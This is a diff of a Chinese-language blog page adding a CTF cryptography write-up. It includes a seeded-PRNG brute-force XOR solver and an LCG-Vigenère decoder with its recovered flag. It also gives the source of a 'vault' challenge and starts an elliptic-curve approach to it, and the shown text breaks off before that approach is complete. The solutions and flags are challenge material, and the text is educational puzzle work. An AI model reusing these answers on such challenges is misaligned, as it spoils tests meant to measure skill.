+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c=<span class="number">444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557</span></span><br><span class="line">N = <span class="number">10000000000</span></span><br><span class="line">N1 = <span class="built_in">int</span>(N * <span class="number">2.5</span>)</span><br><span class="line"><span class="built_in">print</span>(N1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1000000</span>,<span class="number">1000000</span>):</span><br><span class="line">    random.seed(i+N1)</span><br><span class="line">    l = random.getrandbits(<span class="number">328</span>)</span><br><span class="line">    m = long_to_bytes(c ^ l)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="lcvc"><a href="#lcvc" class="headerlink" title="lcvc"></a>lcvc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">state = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;[REDACTED]&quot;</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(flag[<span class="number">0</span>:<span class="number">5</span>]+flag[-<span class="number">1</span>]==<span class="string">&quot;flag&#123;&#125;&quot;</span>)</span><br><span class="line">ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> flag[<span class="number">5</span>:-<span class="number">1</span>]:</span><br><span class="line">    state = (<span class="number">15</span>*state+<span class="number">18</span>)%<span class="number">29</span></span><br><span class="line">    ciphertext+=alphabet[(alphabet.index(character)+state)%<span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"><span class="comment">#mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw</span></span><br></pre></td></tr></table></figure>
+<p>阅读一下题目源码，题目相当于一个移位密码，只不过每次的移位是不固定的，设第i轮的移位是$k<em>i$，则第i+1轮的移位$k</em>{i+1}=(15*k_i+18)%29$，由于$k_0=state$ 已知，所以我们可以轻松迭代出每一轮的移位。计算出每一轮的移位之后，用密文减去对应轮的移位即可恢复明文。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">state = <span class="number">1</span></span><br><span class="line">ciphertext = <span class="string">&quot;mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw&quot;</span></span><br><span class="line">length = <span class="built_in">len</span>(ciphertext)</span><br><span class="line">num = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    state = (<span class="number">15</span>*state+<span class="number">18</span>)%<span class="number">29</span></span><br><span class="line">    num.append(state)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(num) == <span class="built_in">len</span>(ciphertext)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    flag += alphabet[(alphabet.index(ciphertext[i]) - num[i])%<span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#iguessthisiswhatyouwouldcallalinearcongruentialvigenerecipher</span></span><br></pre></td></tr></table></figure>
+<h2 id="the-vault"><a href="#the-vault" class="headerlink" title="the-vault"></a>the-vault</h2><p>最后一题是压轴，对我来说挺困难的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy </span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">admin = <span class="literal">False</span></span><br><span class="line">adminKey = (<span class="number">7024170033995563248669070948202275621832659349979887130360116095557494224289964760016097751188998415</span>, <span class="number">3170315055328760291009922771816122</span>, <span class="number">250376935805204674013389241468539348499776429965769848974957007209785494103442398289504600645160477724</span>, <span class="number">43395542902454917488842651277236247</span>)</span><br><span class="line">publicKey = <span class="number">51133059403872132269736212485462945485381032580683758205093039961914793947944949374017744787298892843604322756848647643991762827932760</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">if</span> key==adminKey:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> admin:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Sorry, you must be an admin to use this key.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> sympy.sympify(sympy.sqrt(key[<span class="number">0</span>]*key[<span class="number">0</span>]*key[<span class="number">3</span>]*key[<span class="number">3</span>]+key[<span class="number">1</span>]*key[<span class="number">1</span>]*key[<span class="number">2</span>]*key[<span class="number">2</span>])).is_integer <span class="keyword">and</span> sympy.sympify(<span class="number">4</span>*key[<span class="number">0</span>]*key[<span class="number">2</span>])/(key[<span class="number">1</span>]*key[<span class="number">3</span>])==publicKey <span class="keyword">and</span> sympy.gcd(key[<span class="number">0</span>],key[<span class="number">1</span>])==<span class="number">1</span> <span class="keyword">and</span> sympy.gcd(key[<span class="number">2</span>],key[<span class="number">3</span>])==<span class="number">1</span> <span class="keyword">and</span> sympy.sympify(key[<span class="number">0</span>])/key[<span class="number">1</span>]&lt;sympy.sympify(key[<span class="number">2</span>])/key[<span class="number">3</span>] <span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(key[<span class="number">0</span>]))&gt;<span class="number">3000</span><span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(key[<span class="number">1</span>]))&gt;<span class="number">3000</span><span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(key[<span class="number">2</span>]))&gt;<span class="number">3000</span><span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(key[<span class="number">3</span>]))&gt;<span class="number">3000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello! To open this vault, you must provide the correct password.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> verify((<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;First key: &quot;</span>)),<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Second key: &quot;</span>)),<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Third key: &quot;</span>)),<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Fourth key: &quot;</span>)))):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You&#x27;re in!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Incorrect. Better luck next time.&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://doc.sagemath.org/html/en/reference/arithmetic_curves/sage/schemes/elliptic_curves/constructor.html">Elliptic curve constructor — Elliptic curves (sagemath.org)</a></p>
+<p>题目的意思很简单，就是让我们输入4个数（4把密钥）然后通过验证即可拿到flag。<code>verify</code>函数的第一个if语句显然是不能用来解题的，于是我们的焦点来到了第二个if语句上。解题的关键就是找到满足第二个if语句的4个数。</p>
+<p>我们需要找到四个数$a,b,c,d&gt;10^{3000}$使得$(ad)^2+(bc)^2$是一个完全平方数，同时$4ac/(bd)=p$，$p$是代码中的publickey，同时我们还有条件$gcd(a,b)=gcd(c,d)=1,a/b&lt;c/d$</p>
+<p>这道题目其实是在有理数域内求解丢番图方程的解。</p>
+<p>经过一通操作可以变成求解$(p/8)Y^2=X^3-X$这个方程，其中两个解$X,Y$都是有理数。</p>
+<p>观察一下这个方程就会发现跟椭圆曲线很相似,利用sage的函数将其变成Weierstrass form形式。</p>
+<p><a target="_blank" rel="noopener" href="https://math.stackexchange.com/questions/880419/a-general-equation-for-pythagorean-triples-of-rational-numbers">https://math.stackexchange.com/questions/880419/a-general-equation-for-pythagorean-triples-of-rational-numbers</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -998,7 +977,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">51</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
